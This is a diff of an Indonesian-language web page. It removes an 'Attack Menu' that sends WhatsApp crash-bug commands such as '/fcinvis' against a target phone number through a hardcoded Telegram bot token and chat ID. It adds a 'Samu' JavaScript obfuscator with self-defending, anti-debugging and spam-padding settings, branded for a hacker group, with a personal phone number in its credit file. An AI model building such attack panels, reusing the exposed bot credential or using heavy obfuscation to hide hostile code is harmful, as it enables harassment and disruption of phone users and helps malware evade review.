@@ -2,137 +2,390 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Attack Menu</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Encrypt JS by SamuDev</title>
+  <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator@4.0.0/dist/index.browser.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    body {
-      background-color: #000;
-      color: red;
-      font-family: 'Courier New', monospace;
+    * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #fff;
+      min-height: 100vh;
+      overflow-x: hidden;
+      padding-top: 60px;
+    }
+
+    .menu-btn {
+      position: fixed;
+      top: 14px;
+      left: 14px;
+      width: 22px;
+      height: 18px;
+      z-index: 1002;
+      cursor: pointer;
+    }
+
+    .menu-btn span {
+      display: block;
+      height: 3px;
+      margin: 4px 0;
+      background: white;
+      border-radius: 2px;
+    }
+
+    .sidebar-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      backdrop-filter: blur(5px);
+      background: rgba(0,0,0,0.4);
+      z-index: 1000;
+      display: none;
+    }
+
+    .sidebar {
+      position: fixed;
+      top: 0;
+      left: -280px;
+      height: 100%;
+      width: 250px;
+      background: #111;
+      padding: 40px 20px;
+      transition: left 0.3s ease;
+      z-index: 1001;
       text-align: center;
     }
 
-    .container {
-      padding: 30px;
-    }
-
-    .title {
+    .sidebar h1 {
       font-size: 28px;
-      font-weight: bold;
-      margin-top: 20px;
-      color: #ff0000;
+      color: #00ffcc;
+      margin-bottom: 40px;
     }
 
-    .logo {
-      margin-top: 50px;
-      margin-bottom: 20px;
-    }
-
-    .logo img {
-      width: 150px;
-      height: auto;
-    }
-
-    input, select {
-      width: 80%;
-      padding: 14px;
-      margin: 15px 0;
-      background: #111;
-      border: 2px solid red;
-      color: red;
-      border-radius: 10px;
-      font-size: 16px;
-      outline: none;
-    }
-
-    .button {
-      background-color: #b10000;
-      color: #fff;
-      border: none;
-      padding: 15px 30px;
-      border-radius: 30px;
-      font-size: 18px;
+    .sidebar .excell-btn {
+      color: #ccc;
+      font-size: 14px;
+      opacity: 0.5;
       cursor: pointer;
-      margin-top: 20px;
-      box-shadow: 0 0 10px red;
+      user-select: none;
     }
 
-    .button:hover {
-      background-color: #ff0000;
+    .sidebar-open {
+      left: 0 !important;
+    }
+
+    .overlay-visible {
+      display: block !important;
+    }
+
+    .excell-popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      backdrop-filter: blur(8px);
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 2000;
+      display: none;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .excell-box {
+      max-width: 90%;
+      width: 350px;
+      background: #111;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px #00ffcc55;
+      color: #fff;
+      font-size: 14px;
+      white-space: pre-wrap;
+      line-height: 1.6;
+      z-index: 2001;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      backdrop-filter: blur(10px);
+    }
+
+    h2 {
+      font-size: 24px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 20px;
+      color: #00ffcc;
+    }
+
+    input[type="file"], textarea, button {
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    input[type="file"] {
+      background-color: #111;
+      border: 1px solid #444;
+      color: #fff;
+      padding: 10px;
+      border-radius: 8px;
+    }
+
+    textarea {
+      height: 300px;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      background: #1a1a1a;
+      color: #fff;
+      font-size: 14px;
+      font-family: monospace;
+      resize: vertical;
+      box-shadow: inset 0 0 8px #000;
+    }
+
+    button {
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      background: #00ffcc;
+      color: #000;
+      transition: all 0.2s ease-in-out;
+    }
+
+    button:hover {
+      background: #00bfa6;
+      transform: scale(1.05);
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .footer a {
+      color: #00ffcc;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* Intro overlay */
+    #introOverlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.9);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      padding: 40px;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    #introText {
+      font-size: 18px;
+      font-weight: 600;
+      max-width: 90%;
+      line-height: 1.6;
+      text-shadow: 0 0 6px #00ffcc;
     }
   </style>
 </head>
 <body>
+
+  <!-- Tombol dashboard -->
+  <div class="menu-btn" onclick="toggleSidebar()">
+    <span></span><span></span><span></span>
+  </div>
+
+  <!-- Sidebar -->
+  <div class="sidebar-overlay" onclick="toggleSidebar()"></div>
+  <div class="sidebar" id="sidebar">
+    <h1>LEXUS</h1>
+    <div class="excell-btn" onclick="showExcellPopup()">Samu</div>
+  </div>
+
+  <!-- Popup Excell -->
+  <div class="excell-popup" id="excellPopup" onclick="hideExcellPopup(event)">
+    <div class="excell-box" id="excellTextBox"></div>
+  </div>
+
+  <!-- Intro Text -->
+  <div id="introOverlay" onclick="hideIntro()">
+    <div id="introText"></div>
+  </div>
+
+  <!-- Main Content -->
   <div class="container">
-    <div class="title">Attack Menu SamsInfinity</div>
-
-    <div class="logo">
-      <img src="https://files.catbox.moe/dix5pa.jpg" alt="logo"/>
+    <h2>🛡️ Encrypt JavaScript by <b>Samu</b></h2>
+    <input type="file" id="fileInput" accept=".js">
+    <textarea id="codeArea" placeholder="Your JavaScript code will appear here..."></textarea>
+    <button onclick="encryptJS()">🔒 Encrypt</button>
+    <button onclick="deleteEnc()">❌ Clear</button>
+    <button onclick="downloadZip()">📦 Download ZIP</button>
+    <div class="footer">
+      Developer: Samu<br>
+      Credit: Samu Official<br>
+      <a href="https://whatsapp.com/channel/0029Vb6bavT8F2pBJ3FYs82p" target="_blank">Update Info</a>
     </div>
-
-    <input type="text" id="targetNumber" placeholder="Target number (e.g. 62812...)">
-
-    <select id="attackType">
-      <option>Invisible ForClose</option>
-      <option>Invisible Delay</option>
-      <option>Invisible Crash</option>
-    </select>
-
-    <button class="button" onclick="sendBug()">▶ SEND BUG</button>
   </div>
 
   <script>
-    function sendBug() {
-      const number = document.getElementById("targetNumber").value.trim();
-      const type = document.getElementById("attackType").value;
-      const token = "7432046690:AAFwGypADBwML-2I5xCDNdYeKVE3uenhJxE";
-      const chatId = "-1002532993003";
+    const introText = "Welcome to the Samu Encrypt Web\nPower. Code. Control.";
+    let introIndex = 0;
+    function typeIntro() {
+      if (introIndex < introText.length) {
+        document.getElementById("introText").innerHTML += introText.charAt(introIndex);
+        introIndex++;
+        setTimeout(typeIntro, 40);
+      }
+    }
+    function hideIntro() {
+      document.getElementById("introOverlay").style.display = "none";
+    }
+    window.onload = typeIntro;
 
-      if (!number.startsWith("62")) {
-        alert("Nomor harus diawali dengan 62 tanpa spasi. Contoh: 62812xxxx");
+    function toggleSidebar() {
+      document.getElementById("sidebar").classList.toggle("sidebar-open");
+      document.querySelector(".sidebar-overlay").classList.toggle("overlay-visible");
+    }
+
+    function showExcellPopup() {
+      const popup = document.getElementById("excellPopup");
+      const box = document.getElementById("excellTextBox");
+      const message = `Lexus
+
+Mereka tak terlihat, tapi jejaknya ada di mana-mana.
+Lexus bukan tim biasa — mereka bayangan di balik celah sistem,
+bergerak diam, menembus batas, dan meninggalkan satu nama: Samu.
+
+Ia bukan sembarang developer. Ia arsitek digital,
+membungkam sistem dengan baris kode dan membangkitkan ketakutan lewat tanda:
+
+> // Eksekusi oleh: Samu //
+
+Saat Lexus muncul, bukan suara yang terdengar…
+hanya server yang diam membeku.`;
+
+      popup.style.display = "flex";
+      box.innerHTML = "";
+      let i = 0;
+      function type() {
+        if (i < message.length) {
+          box.innerHTML += message.charAt(i);
+          i++;
+          setTimeout(type, 25);
+        }
+      }
+      type();
+    }
+
+    function hideExcellPopup(e) {
+      if (!e.target.closest('.excell-box')) {
+        document.getElementById("excellPopup").style.display = "none";
+      }
+    }
+
+    document.getElementById("fileInput").addEventListener("change", function (event) {
+      const file = event.target.files[0];
+      if (!file) return;
+      originalFileName = file.name;
+      const reader = new FileReader();
+      reader.onload = function (e) {
+        originalCode = e.target.result;
+        document.getElementById("codeArea").value = originalCode;
+      };
+      reader.readAsText(file);
+    });
+
+    function generateSpam(count) {
+      let spam = '';
+      for (let i = 0; i < count; i++) {
+        spam += `// 座素晴ExcellOfficial素晴座素晴素晴座\n`;
+      }
+      return spam;
+    }
+
+    function encryptJS() {
+      const inputCode = document.getElementById("codeArea").value;
+      if (!inputCode.trim()) {
+        alert("Code is empty!");
+        return;
+      }
+      try {
+        const obfuscated = JavaScriptObfuscator.obfuscate(inputCode, {
+          compact: true,
+          controlFlowFlattening: true,
+          controlFlowFlatteningThreshold: 1,
+          deadCodeInjection: true,
+          deadCodeInjectionThreshold: 0.8,
+          debugProtection: true,
+          disableConsoleOutput: true,
+          selfDefending: true,
+          stringArray: true,
+          stringArrayEncoding: ['rc4'],
+          stringArrayThreshold: 1,
+          unicodeEscapeSequence: true
+        });
+        const spam = generateSpam(300);
+        const encryptedCode = spam + "\n" + obfuscated.getObfuscatedCode() + "\n" + spam;
+        document.getElementById("codeArea").value = encryptedCode;
+        alert("✅ Successfully encrypted!");
+      } catch (err) {
+        alert("❌ Encryption failed:\n" + err.message);
+      }
+    }
+
+    function deleteEnc() {
+      document.getElementById("codeArea").value = "";
+    }
+
+    function downloadZip() {
+      const code = document.getElementById("codeArea").value;
+      if (!code.trim()) {
+        alert("No code to download.");
         return;
       }
 
-      let message = "";
+      const zip = new JSZip();
+      const creditText = `Developer: Samu\nCredit: Samu Official\nContact: +62 812-1773-9018\n#lexus\n#excel_lexus`;
 
-      switch (type) {
-        case "Invisible ForClose":
-          message = `/fcinvis ${number}`;
-          break;
-        case "Delay Invis":
-          message = `/delay ${number}`;
-          break;
-        case "Invisible Blank":
-          message = `/crack ${number}`;
-          break;
-        default:
-          message = `/fcinvis ${number}`;
-      }
+      zip.file("encrypted.js", code);
+      zip.file("Credit.txt", creditText);
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => {
-        if (response.ok) {
-          alert(`Bug Sedang diproses!\nTarget: ${number}\nJenis: ${type}\nHarap Tunggu 20mentit Sebelum Mengirim lagi`);
-        } else {
-          alert("Gagal mengirim ke Telegram.");
-        }
-      })
-      .catch(error => {
-        alert("Terjadi kesalahan.");
-        console.error(error);
+      zip.generateAsync({ type: "blob" }).then(function(content) {
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(content);
+        a.download = "Encrypt_By_Excell🔒.zip";
+        a.click();
       });
     }
   </script>
 </body>
-</html>
+  </html>
